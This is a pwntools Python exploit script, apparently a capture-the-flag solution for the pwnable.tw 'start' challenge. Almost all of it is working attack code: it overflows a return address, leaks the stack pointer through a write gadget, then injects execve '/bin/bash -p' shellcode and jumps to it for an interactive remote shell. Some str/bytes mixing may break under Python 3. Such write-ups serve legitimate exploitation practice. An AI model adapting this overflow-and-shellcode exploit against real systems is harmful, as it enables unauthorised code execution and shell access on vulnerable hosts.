from pwn import *

context.binary = "./start"

# i modified the shellcode a bit so that esp is added so that way shellcode doesn't overwrite itself by pushing stuff
shellcode = "\x83\xc4\x40\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3" \
            "\x52\x51\x53\x89\xe1\xcd\x80"

e = ELF("./start")
p = remote("chall.pwnable.tw", 10000)

# idk if it's needed but idc enough to change it
pad = lambda x: x + "\0" * (0x3c - len(x))

# gadget to write 20 bytes from stack to stdout
read_stack = p32(0x8048087)

# gadget to write from stdin to [ecx]
write_ecx = p32(0x8048091)

# get rid of welcome clutter from recv buffer
p.recv(20)

# overflow ret pointer so now it points to gadget that will read the stack
p.send((5 * 'AAAA').encode() + read_stack)

# stack is not set up properly since we ropped here and we can read esp which was pushed onto the stack
esp = unpack(p.recv(20)[:4])

# log the address of ecx (the additions and subtractions are replicas of the instructions that modify the stack pointer
# since ecx = esp at one point
log.info(hex(esp - 28 + 0x14 + 4))

# since the end of the gadget adds 0x14 to esp, I try to make room for the shellcode by adding to esp, since esp (which
# dicates what address will hold the return pointer) will be increased, but ecx will not. the size of the shellcode is
# limited to the beginning of ecx to the address of the return pointer, but by adding to esp I increase this limit.
p.send(pad((5 * 'BBBB').encode() + write_ecx))

p.send(pad(
    (shellcode + (44 - len(shellcode)) * "\0" + p32(
        esp - 28 + 0x14 + 4))))  # increase again, making space for shellcode
p.interactive()
